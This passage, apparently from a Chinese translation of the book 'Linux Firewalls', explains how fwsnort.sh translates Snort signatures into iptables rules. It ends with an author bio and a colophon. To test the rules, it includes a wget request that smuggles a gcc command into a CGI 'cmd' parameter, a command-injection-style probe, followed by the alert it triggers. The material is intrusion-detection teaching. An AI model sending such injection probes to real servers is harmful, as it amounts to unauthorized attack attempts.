在 ❶ 处，执行 `fwsnort` 时使用的命令行参数被包含在 `fwsnort.sh` 的头部。这对于准确确定 `fwsnort` 如何构建 `fwsnort.sh` 脚本非常有帮助。在 ❷ 处，`fwsnort.sh` 创建一组自定义链，所有的签名匹配规则都添加到其中。这保持了 `fwsnort` 规则与系统中任何现有 `iptables` 策略规则之间的某种隔离。结果是 `fwsnort` 策略与任何现有的 `iptables` 策略兼容。

一组 `iptables` 规则开始于 ❸；这些规则使用 `Netfilter` 连接跟踪系统将属于 `ESTABLISHED` 连接的 TCP 数据包通过 `fwsnort` 链 `FWSNORT_FORWARD_ESTAB`、`FWSNORT_INPUT_ESTAB` 和 `FWSNORT_OUTPUT_ESTAB`。这允许 `fwsnort` 将复杂的应用层字符串匹配操作限制在属于真实 TCP 连接的数据包上。所有添加到这些链中的翻译后的 Snort 规则都包含 `flow: established;` 选项。关于此主题的更多信息可以参考第 9 章。

`fwsnort.sh` 脚本的核心内容开始于 ❹。在这里，`iptables` 被指示在应用层数据搜索七种 Snort 签名描述的字符串。如果任何 `iptables` 规则触发了网络会话，就会生成一个 `iptables` syslog 消息供 `psad` 分析。最后，在 ❺ 处，`fwsnort` 策略删除并添加规则，将网络流量从内置的 `INPUT`、`OUTPUT` 和 `FORWARD` 链跳转到自定义的 `fwsnort` 链 `FWSNORT_INPUT`、`FWSNORT_OUTPUT` 和 `FWSNORT_FORWARD`。（先删除跳转规则允许 `fwsnort.sh` 脚本多次执行而不添加多个相同的跳转规则。）一旦网络流量跳转到 `fwsnort` 链，就会对每个数据包执行 `fwsnort` 白名单、黑名单和签名检查操作。

要在 Linux 内核中激活 `fwsnort` 策略，只需执行 `fwsnort.sh` 脚本：

```
 [iptablesfw]# /etc/fwsnort/fwsnort.sh
[+] Adding web-attacks rules.
    Rules added: 14
```

最后，为了验证 `fwsnort` 策略正在工作，你可以从外部系统向内部 Web 服务器发送一个包含字符串 `/usr/bin/gcc` 的伪造网络请求（参见图 1-2）：

```
 [ext_scanner]$ wget http://71.157.X.X/cgi/test.cgi?cmd=/usr/bin/gcc%20%2dWall%20
test%2e
--19:44:58--  http://71.157.X.X/cgi/test.cgi?cmd=/usr/bin/gcc%20%2dWall%20test%2e
           => 'test.cgi?cmd=%2Fusr%2Fbin%2Fgcc -Wall test.'
Connecting to 71.157.X.X:80... connected.
HTTP request sent, awaiting response... 404 Not Found
19:44:58 ERROR 404: Not Found.
```

发送网络请求后，你将看到 iptables 系统的 syslog 中写入了以下日志消息：

```
 Mar 18 19:45:03 iptablesfw kernel: [5] SID1341 ESTAB IN=eth0 OUT=eth1 SRC=144.202.X.
X DST=192.168.10.3 LEN=198 TOS=0x00 PREC=0x00 TTL=63 ID=60529 DF PROTO=TCP SPT=42180
DPT=80 WINDOW=92 RES=0x00 ACK PSH URGP=0
```

# 关于作者

Michael Rash 是 Enterasys Networks 公司 Dragon 入侵检测系统的安全架构师，也是开源项目的频繁贡献者。作为 `psad`、`fwknop` 和 `fwsnort` 的创建者，Rash 是防火墙、IDS、操作系统指纹和 Snort 规则语言方面的专家。他是书籍《Snort 2.1 Intrusion Detection》的合著者，书籍《Intrusion Prevention and Active Response》的首席作者和技术编辑，并在 *Linux Journal*、*SysAdmin* 和 *.login:* 上撰写过安全文章。

# 结语

《Linux Firewalls》使用 Adobe FrameMaker 排版。使用的字体族为：正文使用 New Baskerville，标题和表格使用 Futura，大标题使用 Dogma。

本书在密歇根州安娜堡的 Malloy Incorporated 打印并装订。使用的是 Glatfelter Thor 60# Antique 纸张，由 15% 的消费后内容制成。书采用 RepKover 装订方式，使其在打开时可以平放。
